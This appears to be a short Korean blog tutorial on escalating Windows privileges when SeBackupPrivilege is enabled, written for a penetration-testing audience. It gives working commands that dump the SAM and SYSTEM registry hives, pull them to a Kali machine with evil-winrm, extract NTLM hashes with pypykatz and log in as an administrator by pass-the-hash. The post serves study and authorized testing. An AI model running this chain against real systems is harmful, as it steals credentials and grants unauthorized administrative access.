---
layout: post
title: 백업 권한을 이용한 윈도우 권한 상승
subtitle: SeBackupPrivilege가 있을 때 권한 상승 방법
category: knowledge
thumbnail-img: /assets/img/knowledge/backuppriv.png
tags: [windows, SeBackupPrivilege]
author: Hong
---
이번 포스팅에서는 아래 이미지와 같이 SeBackupPrivilege가 활성화되어 있는 경우 권한 상승하는 방법에 대해 써보겠다.

![SeBackupPrivilege](/assets/img/knowledge/backuppriv.png)

참고로 위의 권한은 `whoami /priv나 /all 명령어로 확인 할 수 있다.`
# sam, system 파일을 가져오기

이 수법의 특징은 모든 파일을 읽을 수 있다는 것.

다음과 같은 명령어를 입력한다.
```powershell
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
템프 디렉토리에 sam파일과 system파일을 저장한다.

kali에 위 파일들을 가져오기 위해 evil-winrm같은 툴로 다운로드 한다.
```powershell
cd Temp
download sam
download system
```
# NTLM 해쉬 추출
파일들을 옮겼으면 해쉬를 추출하기 위해 pypykatz를 이용한다.

이렇게 하는 이유는 윈도우에서 mimikatz를 관리자 권한으로 실행 할 수 없기 때문.

`pypykatz registry --sam sam system`

실행하면 아래와 같이 유저와 그에따른 해쉬값이 추출되어 나타난다.
![NTLMhash](/assets/img/knowledge/NTLMhash.png)
위의 해쉬값을 이용하여 관리자 권한을 가진 유저로 로그인한다.

`evil-winrm -i 192.168.x.x -u raj -H <해쉬>`

이렇게해서 백업 권한을 가진 경우 민감한 파일을 복사해 kali로 옮긴 후 해쉬를 추출해보았다.